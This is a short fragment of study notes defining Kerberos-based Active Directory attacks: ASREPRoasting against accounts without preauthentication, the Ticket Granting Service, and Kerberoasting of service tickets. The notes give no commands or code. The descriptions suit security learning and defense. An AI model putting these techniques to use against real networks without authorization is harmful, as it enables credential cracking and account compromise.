ASREPRoasting is a post-exploitation attack technique targeting the Kerberos authentication protocol in Active Directory environments. The goal is to extract and potentially crack the hashed password of user accounts that are vulnerable due to their configuration. AS-REP (Authentication Service Response) is a part of the Kerberos authentication process. When a user requests a Kerberos Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), the KDC replies with an encrypted AS-REP message. The encryption is based on the user's password-derived key. Some accounts (e.g., service accounts or misconfigured user accounts) have the “Do not require Kerberos preauthentication” flag enabled. Without preauthentication, an attacker can directly request the AS-REP for an account without providing valid credentials.

</aside>

## Kerberos Ticket Granting Service (TGS)

<aside>
💡

The Kerberos Ticket Granting Service (TGS) is a key component of the Kerberos authentication protocol, which is widely used in Windows Active Directory environments and other systems that implement Kerberos. The TGS is responsible for issuing service tickets that allow authenticated users to access specific network services securely.

</aside>

## Keberoasting

<aside>
💡

Kerberoasting is a post-exploitation attack technique targeting Kerberos service tickets in Active Directory environments. The attack exploits how Kerberos handles service account authentication, allowing attackers to extract and crack service account credentials offline.

</aside>